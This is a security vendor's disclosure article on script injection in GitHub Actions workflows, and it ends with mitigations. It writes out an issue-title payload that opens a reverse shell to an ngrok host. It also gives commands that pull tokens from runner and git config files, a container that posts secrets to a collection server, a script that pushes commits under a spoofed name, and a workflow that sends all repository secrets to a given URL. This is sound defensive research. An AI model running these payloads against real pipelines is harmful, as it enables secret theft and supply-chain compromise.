# How we discovered vulnerabilities in CI/CD pipelines of popular open-source projects | Cycode Docs

Source: https://docs.cycode.com/knowledge-base/frequently-asked-questions-faq/how-we-discovered-vulnerabilities-in-ci-cd-pipelines-of-popular-open-source-projects

---

# How we discovered vulnerabilities in CI/CD pipelines of popular open-source projects

[](https://gitlab.com/cycodehq/documentation/cycode_docs/-/blob/main/src/content/knowledge-base/frequently-asked-questions-faq/how-we-discovered-vulnerabilities-in-ci-cd-pipelines-of-popular-open-source-projects.md "Edit this page")

Updated on Jul 11, 2024 • Published on Apr 12, 2024

* * *

The upsurge of supply-chain incidents in recent years highlights the importance of protecting build servers and deployment processes. In the case of GitHub Actions, GitHub has implemented many security features for their hosted runners – isolation, ephemeral environments, golden images, and more. Yet, we will demonstrate in this article that innocent mistakes in writing pipelines could compromise the entire source code and cause potential supply-chain incidents even when it runs in isolated build environments.

## Executive summary [Copied!](#executive-summary "Copy link to this section")

Cycode discovered **critical vulnerabilities** in several **popular open-source projects**, each of which can cause a supply-chain attack through the CI process. We found the vulnerabilities in **misconfigured GitHub Actions workflows**. They were missing proper input sanitizing, allowing malicious actors to inject code into the builds through issues and comments, and to access privileged tokens.

Out of dozens of vulnerable repositories we found and reported, the most popular were:

*   Liquibase – Track, version, and deploy database schema changes. Applied fix – 3278525.
*   Dynamo BIM – A visual programming tool that is sponsored by Autodesk. Applied fix – disabled the workflows.
*   FaunaDB – Transactional database delivered as a secure and scalable cloud API with native GraphQL. Applied fix – ee6f53f.
*   Wire – An open-source communication platform. Applied fix – 9d39d6c.
*   Astro – Static site builder. Applied fix – 650fb1a.
*   Kogito – A business automation technology that is sponsored by Red Hat. Applied fix – 53c18e5.
*   Ombi – A popular media request tool. Applied fix – 5cc0d77.

Summing up the users of these tools, these vulnerabilities can impact **millions of potential victims**.

We responsibly disclosed these vulnerabilities to the organizations and the maintainers, and they fixed them quickly. We didn’t find any signs of prior exploitation of the vulnerable workflows.

**Note**  
These aren’t vulnerabilities in GitHub Actions infrastructure but in misusing workflows and not applying best practices. Such vulnerabilities could also be found in private GitHub repositories.

## Article outline [Copied!](#article-outline "Copy link to this section")

Cycode is a leader in software supply chain security solutions, and it is our responsibility to increase the awareness and educate around security issues in code and build systems. Apart from reporting these vulnerabilities, we want to share with the community our journey through the research and elaborate on the following topics:

*   What is the GitHub Actions platform, and what makes it a powerful build system.
*   Explaining GitHub Actions security concepts, including how you can leverage misconfiguration such as the ones we found into code execution.
*   Diving into GitHub Actions internals to understand what malicious actors could achieve with code execution on the runners.
*   Describing possible mitigations for such vulnerabilities and best practices for developers and DevOps teams using GitHub Actions.

## Background [Copied!](#background "Copy link to this section")

For most of its history, GitHub was all about storing source code. In 2018, they [announced](https://github.blog/2018-10-17-action-demos/) that they are going in a different but related direction by launching GitHub Actions – a CI/CD platform allowing GitHub developers to automate development workflows easily. Since then, GitHub Actions have become extremely popular mainly due to its [Marketplace](https://github.com/marketplace?type=actions) , containing more than 11 thousand actions, and free hosted runners for public repositories.

Any repository on GitHub can add YAML files (called workflows) in the `.github/workflows` path, and once certain events occur, it will run your jobs. For example, the following workflow dictates that each repository push will run code that prints “Hello World!”.

```
1
2
3
4
5
6
7
```

```yaml
name: GitHub Actions Demo
on: [push]
jobs:
 Actions-Hello-World:
   runs-on: ubuntu-latest
   steps:
     - run: echo "Hello World!"
```

Like every continuous integration system, its usages may vary. Sample workflows could be:

*   Building the code into a container and uploading it to the chosen registry.
*   Scheduled tasks that scan vulnerabilities in code.
*   Running tests for forked pull requests.
*   Automatic labeling for issues.
*   Sending issues to ticket handling system (Jira/Monday/Asana/etc.).
*   Supporting automatic merges for PR created by external bots.
*   And more.

## GitHub Actions security [Copied!](#github-actions-security "Copy link to this section")

GitHub runner is an environment running [this open-source code](https://github.com/actions/runner) that connects to a personal account or an organization and listens to the workflow queue.

GitHub allows the developers to either set up their runners on self-hosted machines, or the more popular method, on GitHub-hosted machines. While in the former case, GitHub is limited in providing security measures, in the latter case, they [explain](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners) that each job in your workflow will run on a completely clean virtual machine with pre-built tools depending on the selected operating system.

As explained [here](https://github.com/actions/runner/blob/main/docs/design/auth.md) , before the runner receives anything, it needs to be authorized to run jobs for that specific user/organization. It then gets a valid OAuth JWT token, which is saved in `.credentials` file and utilized to receive jobs from GitHub Actions service API.

Apart from the OAuth token, at the start of each workflow run, GitHub automatically creates a unique `GITHUB_TOKEN`, which is used to authenticate and access GitHub resources (code, PR, issues, and more). While for forked repositories, this token is limited to only read permissions, for any other event, it has default read and write capabilities. When the job starts, this token is passed to the runner, passing it to any subprocess it creates securely and is never persisted on the machine.

This GitHub runner environment introduces three main risks which we will tackle in this article:

*   A malicious actor committing undesired code into the repository can cause a critical supply chain incident as an attacker can introduce backdoors deployed to end-users or organization environments. To achieve this, an attacker would need to fetch sensitive tokens with write permissions for that repository. This could be done by utilizing the GITHUB\_TOKEN created for that workflow or any other PAT (Personal Access Token).
*   A malicious actor could exfiltrate workflow secrets and, in some cases, also repository or organization secrets. These secrets could be tokens for private repositories, container registries, cloud assets, or any other sensitive information.
*   A much smaller risk would be the malicious actor’s ability to run botnets or crypto miners using your runner infrastructure.

To help us configure the runners properly, GitHub supplies extensive [best-practice](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions) documentation. By going over this document, we understand that many security pitfalls await developers building these workflows – vast enough that even popular repositories with tens of thousands of stars fail to implement. This is how our research started.

## Issue Injection 101 [Copied!](#issue-injection-101 "Copy link to this section")

Let’s take the following workflow as an example:

```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
```

```yaml
name: Issues
on:
  issues:
    types: [opened]
jobs:
  print_issue_title:
    runs-on: ubuntu-latest
    name: Print issue title
    steps:
    - run: echo "${{github.event.issue.title}}"
```

This sample workflow will print the issue name on each created issue in the repository. At first sight, it looks innocent, but what will happen if we open an issue with the following title: `new issue title" && ls / && echo "`?

![](/assets/image-68.png)

We managed to run the `ls /` command on the hosted runner!

The GitHub service which dispatches these workflows to the hosted runners replaces the macros `${{ ... }}` blindly, so echo `"${{github.event.issue.title}}"` becomes `echo "new issue title" && ls / && echo ""`, thus, giving us arbitrary code execution capabilities.

In addition, the default `GITHUB_TOKEN` created for this event has read/write access to the repository and potentially allows us to commit changes to it.

So far, we have given you a brief background on GitHub Actions security and how a malicious actor can inject a controlled code into a privileged build pipeline. Let’s dive deeper into how the risks mentioned above can be materialized through deep dive into GitHub runner internals.

## Diving into GitHub Actions Runner [Copied!](#diving-into-github-actions-runner "Copy link to this section")

### Security limitations in GitHub Runners [Copied!](#security-limitations-in-github-runners "Copy link to this section")

As part of the security model that GitHub implemented, not everything is achievable as an attacker, even with code execution capabilities. We will list some of the main limitations:

**Clean workspace per job** – each new job (each workflow may contain several jobs) will run on a clean, VM isolated instance. On the one hand, persistence in the runner can affect subsequent steps, but on the other hand, persistence will affect the currently running job only.

**Secrets are passed per step** – each workflow job contains one or more steps; these steps, which may contain secrets, are transferred to the runner just before the execution. This means that if subsequent steps don’t run for any reason, their secrets won’t be reachable to the runner.

**Permissions for `GITHUB_TOKEN`** – We explained previously that at the start of each workflow run, GitHub creates a new `GITHUB_TOKEN` with the appropriate permissions (explained [here](https://docs.github.com/en/actions/security-guides/automatic-token-authentication) ). The token permissions could be altered by either adding the `permissions`: line in the workflow file or through the organization configuration. In addition, this token has several limitations; for example, it can’t edit repository workflow files.

![](/assets/image-69.png)

## Exploring the GitHub Runner through arbitrary code execution [Copied!](#exploring-the-github-runner-through-arbitrary-code-execution "Copy link to this section")

Based on our experience with the vulnerabilities we found, we built an intentionally vulnerable workflow to investigate how a malicious actor could exploit it to his needs. We will use this workflow frequently along with the article.

```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
```

```yaml
name: Demo vulnerable workflow
on:
  issues:
    types: [opened]
env:
  # Environment variable for demonstration purposes
  GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
jobs:
  vuln_job:
    runs-on: ubuntu-latest
    steps:
     # Checkout used for demonstration purposes
      - uses: actions/checkout@v2
    
      - run: |
         echo "ISSUE TITLE: ${{github.event.issue.title}}"
         echo "ISSUE DESCRIPTION: ${{github.event.issue.body}}"
      - run: |
         curl -X POST -H "Authorization: Token ${{ secrets.BOT_TOKEN }}" -d '{"labels": ["New Issue"]}' ${{ github.event.issue.url }}/labels
```

This workflow does a simple task – whenever a new issue is created, it will check out the code, print the issue details to the log, and label it as “New Issue” using a PAT.

As we previously explained, the line echo `"ISSUE TITLE: ${{github.event.issue.title}}"` is vulnerable to command injection. To explore the capabilities of our post-exploitation on the runner machine, we will create a simple reverse shell using a [ngrok](https://ngrok.com) .

First, we initiate ngrok by running `ngrok tcp 10000` on our machine; second, we run a local Netcat listener with `nc -lv 10000` and use the ngrok endpoint, for example, `8.tcp.ngrok.io:15063` in our payload.

So our payload would be creating a new issue with the following name:

```
New malicious issue title" && bash -i >& /dev/tcp/8.tcp.ngrok.io/15063 0>&1 && echo "
```

![](/assets/image-70.png)

![](/assets/image-71.png)

We are running a reverse shell inside the runner!

**Note**  
This demonstrates exploitation techniques for when the runner is Ubuntu-based. With a few tweaks, it could work on windows-based and Mac-based machines.

While exploring the runner, we could find several interesting things:

In the runner folder `/home/runner/runners/2.287.1`, we could see a `.credentials` file containing the OAuth JWT token used for receiving jobs from the GitHub Actions service.

```
1
2
```

```bash
$ cat /home/runner/runners/2.287.1/.credentials
{"data":{"token":"REDACTED"},"scheme":"OAuthAccessToken"}
```

That folder also contains a `.runner` file that helps to authenticate and receive the right jobs.

```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
```

```bash
$ cat /home/runner/runners/2.287.1/.runner
{
  "AgentId": "1",
  "AgentName": "Hosted Agent",
  "PoolId": "2",
  "ServerUrl": "https://pipelines.actions.githubusercontent.com/REDACTED/",
  "SkipSessionRecover": "True",
  "IsHostedServer": "True",
  "workFolder": "_work",
  "WorkFolder": "/home/runner/work",
  "MonitorSocketAddress": "127.0.0.1:49100"
}
```

By looking at the relevant processes using `ps -aux | grep runner` and combining the previous knowledge, we could deduce the execution flow of the runner:

*   The runner process is being provisioned by some .NET executable called provisioner. It provisions the `Runner.Listener` executable, which uses the OAuth credentials to fetch the job from the GitHub Actions service.
*   Once `Runner.Listener` fetched a job, it creates the `Runner.Worker` and passes it job information, including `GITHUB_TOKEN` through an IPC.
*   Once the `Runner.Worker` received a `run` command, it writes the shell script to the disk and runs it through bash

```
1
2
3
4
```

```text
root         664  0.8  1.2 3684004 85660 ?       Ssl  17:53   0:02 /opt/runner/provisioner/provisioner --agentdirectory /home/runner/runners --settings /opt/runner/provisioner/.settings
runner      1391  0.9  1.4 3639900 102872 ?      Sl   17:54   0:02 /home/runner/runners/2.287.1/bin/Runner.Listener run
runner      1410  1.6  1.6 3674340 114088 ?      Sl   17:54   0:03 /home/runner/runners/2.287.1/bin/Runner.Worker spawnclient 112 115
runner      1512  0.0  0.0   8704  3440 ?        S    17:54   0:00 /usr/bin/bash -e /home/runner/work/_temp/39dda61c-1cea-4106-b28e-ec9a4f223df2.sh
```

*   The `~/work/_temp/_github_workflow/event.json` file contains complete information regarding the triggered event for the workflow.
*   The `~/work/_actions` folder contains all dependent actions we run. For example: `~/work/_actions/actions/checkout/v2` includes all the checkout action source code.

## Extracting secrets from the workflow [Copied!](#extracting-secrets-from-the-workflow "Copy link to this section")

### Secrets in environment variables [Copied!](#secrets-in-environment-variables "Copy link to this section")

In the sample workflow above, we defined `GITHUB_TOKEN` as an environment variable for the entire job. We can fetch its content quickly and abuse it for malicious means in such cases:

```
1
2
```

```bash
$ env | grep GITHUB_TOKEN 
GITHUB_TOKEN=ghs_REDACTED
```

If the environment variable was defined on the step level, it would be accessed only in that step it was described. This could make it harder to fetch the secrets, but it is possible for advanced attackers, as we’ll show soon.

### Secrets from the checkout action [Copied!](#secrets-from-the-checkout-action "Copy link to this section")

Checkout is one of the most popular actions in the marketplace. To put it simply, it does `git clone` to your repository using your `GITHUB_TOKEN` as a default value.

In its default behavior, it also saves the credentials in the `.git/config` file. Due to that action usage, we can easily extract the `GITHUB_TOKEN` in our example.

```
1
2
3
4
```

```bash
$ cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION
extraheader = AUTHORIZATION: basic REDACTED
$ cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d 
x-access-token:ghs_REDACTED
```

### Secrets in run scripts [Copied!](#secrets-in-run-scripts "Copy link to this section")

If we peek at the `$RUNNER_TEMP` directory, which maps to `/home/runner/work/_temp`, we’ll notice that each `run` step appears as a separate shell file.

```
1
2
3
4
5
6
```

```text
total 20K
drwxr-xr-x 4 runner docker 4.0K Feb 21 17:54 .
drwxr-xr-x 6 runner root   4.0K Feb 21 17:54 ..
-rw-r--r-- 1 runner docker  132 Feb 21 17:54 39dda61c-1cea-4106-b28e-ec9a4f223df2.sh
drwxr-xr-x 2 runner docker 4.0K Feb 21 17:54 _github_workflow
drwxr-xr-x 2 runner docker 4.0K Feb 21 17:54 _runner_file_commands
```

These shell files contain the run scripts defined in the workflow definition. In our case, the only shell file written is the one that was vulnerable to the injection attack:

```
1
2
3
```

```bash
$ cat $RUNNER_TEMP/39dda61c-1cea-4106-b28e-ec9a4f223df2.sh 
echo "ISSUE TITLE: New malicious issue title" && bash -i >& /dev/tcp/8.tcp.ngrok.io/15063 0>&1 && echo "" 
echo "ISSUE DESCRIPTION: "
```

So this means that if `${{ secrets... }}` were used inside a `run` command, we’d be able to see these secrets as plain text by inspecting these files. In our example, we didn’t have any past `run` commands with secrets, but there is one future command which contains `BOT_TOKEN` secret.

So how can we fetch that future secret? We create persistence. All subsequent steps are running on the same machine, so we need to log any new file created in the `$RUNNER_TEMP` folder.

One possible implementation for this could be a simple Python script using the [watchdog](https://pypi.org/project/watchdog/) package to monitor changes to folders. For each newly added shell file, the script will send it to a controlled server via a `POST` request. To ease its deployment, this script could be built into a container and be run easily in the runner through Docker.

To demonstrate this capability, we tried running it in our lab environment in the following way:

*   Creating and deploying in our lab a Python server that records all POST requests.
*   Creating a Python script that records modified shell scripts in a directory and sends them to a designated server.
*   Packing the malicious script into a docker container.
*   Running the container image in a detached mode:

```
1
```

```bash
sudo docker run --rm -d -v /home/runner/work/_temp:/app/monitored $DOCKER_USERNAME/actionmonitor $LAB_URL
```

Once we continue and exit the shell, we receive the secret from the subsequent `run` command:

```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
```

```text
INFO:root:POST request,
Path: /
Headers:
Host: REDACTED
User-Agent: python-requests/2.27.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 316
Content-Type: multipart/form-data; boundary=c02346046d63dd9df9d114fa5cd7f1f2
Body:
--c02346046d63dd9df9d114fa5cd7f1f2
Content-Disposition: form-data; name="upload_file"; filename="71d7557f-0295-4ef5-972a-b3ba3b7ccc24.sh"
curl -X POST  -H "Authorization: Token ghp_REDACTED" -d '{"labels": ["New Issue"]}' https://api.github.com/repos/REDACTED/demo/issues/6/labels
--c02346046d63dd9df9d114fa5cd7f1f2--
```

### Additional advanced methods to exfiltrate secrets [Copied!](#additional-advanced-methods-to-exfiltrate-secrets "Copy link to this section")

Once we have complete control of the runner, we also have full control over its subsequent operations, whether bash commands, passing secrets through environment variables, or external actions.

This means that if secrets were passed to actions, explicitly or implicitly (through default value), we can record them and use them maliciously. A POC code for this behavior is out of this article’s scope, but we can share some possible methods to achieve this behavior:

*   Some secrets, including input variables, are passed through environment variables. Recording all created processes and exfiltrating their environment variables could also achieve that goal.
*   All subsequent steps, including environment variables and input for additional actions, are sent to the runner through the network. We can record all the network traffic and extract sensitive information.
*   We can create an additional runner listener using the previously mentioned OAuth credentials. With the right timing, our runner could potentially receive the same job again from the start. We can record the complete job information by either listening to HTTP traffic or by intercepting the IPC communication and extracting the `GITHUB_TOKEN` for this new job.
*   It should be possible to research the memory layout of the `Runner.Worker` process and extract `GITHUB_TOKEN` from there.

### Committing malicious code to the repository [Copied!](#committing-malicious-code-to-the-repository "Copy link to this section")

The most significant possible impact of these vulnerabilities is the ability to affect millions of end-users by inserting malicious changes into the repository without notice, as happened in [codecov](https://cycode.com/blog/the-codecov-breach-development-infrastructure-is-the-weakest-link-its-now-rapidly-being-exploited/) and [SolarWinds](https://cycode.com/blog/six-appsec-learnings-from-solar-winds/) .

In our example, we already had a prepared git environment because we were using the checkout action, but we could also set it up using `GITHUB_TOKEN` or any other access token. We prepared the following simple script to demonstrate how easily a code could be committed to the repository:

```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
```

```hcl
#!/bin/bash
# File to commit
FILE_URL_PATH_TO_COMMIT=$1
# Repository path where to commit
PATH_TO_COMMIT=$2
COMMIT_NAME="Maintainer Name"
COMMIT_EMAIL="maintainer@gmail.com"
COMMIT_MESSAGE="innocent commit message"
# Fetching the file
curl $FILE_URL_PATH_TO_COMMIT -o $PATH_TO_COMMIT --create-dirs
# Commiting to the repo
git add *
find . -name '.[a-z]*' -exec git add '{}' ';' # Adding hidden files
git config --global user.email $COMMIT_EMAIL
git config --global user.name "$COMMIT_NAME"
git commit -m "$COMMIT_MESSAGE"
git push -u origin HEAD
```

This script could be run manually in the reverse shell (as shown below) or easily automated. Let’s run it by giving it a remote file URL to commit, and the desired path:

```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
```

```bash
$ curl -o /tmp/script.sh $SCRIPT_URL 
$ chmod +x /tmp/script.sh 
$ /tmp/script.sh $MALICIOUS_FILE_URL innocent_file.txt  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed 
100     5  100     5    0     0    333      0 --:--:-- --:--:-- --:--:--   333 
[main 196e93a] innocent commit message 
 1 file changed, 1 insertion(+) 
 create mode 100644 innocent_file.txt 
To <https://github.com/REDACTED/REDACTED>   
    ff7a7fd..196e93a  HEAD -> main 
branch 'main' set up to track 'origin/main'.
```

When we look at our vulnerable repository, we’ll notice the commit made by “Maintainer Name”, as indicated in the script.

![](/assets/image-72.png)

Sophisticated attackers could further enhance this capability and hide their traces by altering the git tree so the commit won’t be in plain sight.

## Extracting repository and organizational secrets [Copied!](#extracting-repository-and-organizational-secrets "Copy link to this section")

Attackers could apply additional methods to exfiltrate repository and organizational secrets other than the ones of the workflow by creating a new workflow.

**Note**  
By default, `GITHUB_TOKEN` doesn’t have permission to push into the `.github/workflows` directory; hence, this method applies only if the attacker gets a personal access token or GitHub App token with workflow permissions.

A sample method for such attack would be creating a workflow similar to the one below and running it through GitHub API by giving it server URL as an input.

```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
```

```yaml
name: Secrets
on:
 workflow_dispatch:
   inputs:
     url:
       required: true
jobs:
 build:
   runs-on: ubuntu-latest
   steps:
     - run: |
         echo "${{ toJSON(secrets) }}" > .secrets
         curl -X POST -s --data "@.secrets" ${{ github.event.inputs.url }} > /dev/null
```

Once you commit the workflows using the methods we showed above, you can run it by using the following GitHub API:

```
1
```

```bash
curl -X  POST -d '{"ref": "<REF>", "inputs": {"url": "<SERVER_URL>"}}' -H "Authorization: Token ghp_REDACTED" https://api.github.com/repos/<USER>/<REPO>/actions/workflows/<WORKFLOW_ID>/dispatches
```

Running this action will send all repository and organization secrets that the access token has permissions, including those that weren’t appearing in the workflow. So, when we look at our lab server, we can see these secrets:

```
{  
    github_token: ghs_REDACTED,  
    SECRET1: secret_value
    SECRET2: another_secret_value,  
}
```

### Mitigations [Copied!](#mitigations "Copy link to this section")

We will present several methods by which you can protect your workflows and deny the techniques we demonstrated above.

**Avoid `run` steps and use external actions instead.** For example, instead of running `curl` for updating a comment, you can use [peter-evans/create-or-update-comment](https://github.com/marketplace/actions/create-or-update-comment) that does it for you. Dependent actions are less prone to script-injection attacks and are favored.

**Sanitize your input using environment variables.** In our example, if we declared the unsafe input using an environment variable, we weren’t vulnerable to the attack. The safe approach looks like the following:

```
1
2
3
4
5
6
```

```text
 - env:
         TITLE: ${{github.event.issue.title}}
         DESCRIPTION: ${{github.event.issue.body}}
       run: |
         echo "ISSUE TITLE: $TITLE"
         echo "ISSUE DESCRIPTION: $DESCRIPTION"
```

Limit your `GITHUB_TOKEN permissions`. We want to overwrite the default permissions of the token to the minimum needed for the workflow’s operation. We can do that using the permissions tag in the workflow file. For example, `permissions: read-all` will give your token read-only permissions.

**Limit your PAT/GitHub Apps token permissions.** When `GITHUB_TOKEN` isn’t sufficient, additional tokens could be used to automate processes. These tokens could be more permissive than `GITHUB_TOKEN` and thus should be limited accordingly.

**Limit the exposure of your secrets.** When you create organizational secrets, it’s better to set the exact repositories that will use them.

![](/assets/image-73.png)

**Require approval for all outside collaborators.** The default behavior is to require manual approval for first-time contributors. In that case, an attacker could create a simple and innocent pull request (like documentation update). When accepted, his subsequent pull request could be malicious and automatically trigger the workflow. So “Require approval for all outside collaborators” brings a more robust defense.

![](/assets/image-74.png)

## Conclusion [Copied!](#conclusion "Copy link to this section")

Unlike many vulnerability disclosures in the InfoSec industry, most of our reported vulnerabilities were fixed on the same day we reported them. It emphasizes the dissonance between the potential exploitation damage such an innocent mistake could have and how easy it is to fix it.

Your build systems, and especially GitHub Actions workflows, are critical paths in your software deployment – it can affect the final artifacts shipped to users, contains sensitive secrets like cloud tokens, and should be protected accordingly with security reviews, best practices, and by using external tools like Cycode’s platform.

## How can Cycode help you? [Copied!](#how-can-cycode-help-you "Copy link to this section")

Cycode’s platform secures your software supply chain by providing complete visibility into enterprise DevOps tools and infrastructure. With a simple GitHub integration, Cycode’s platform will detect the vulnerabilities mentioned above and additional configuration issues in your GitHub Actions workflows and help you remediate them. Such violations will look like the following:

![](/assets/image-75.png)

Was this article helpful?

Yes No

Thanks for your feedback!

## Help us improve this article

×

Need more information Inaccurate or irrelevant content Difficult to understand Missing/broken link Others

Characters: 0/255

Cancel Submit
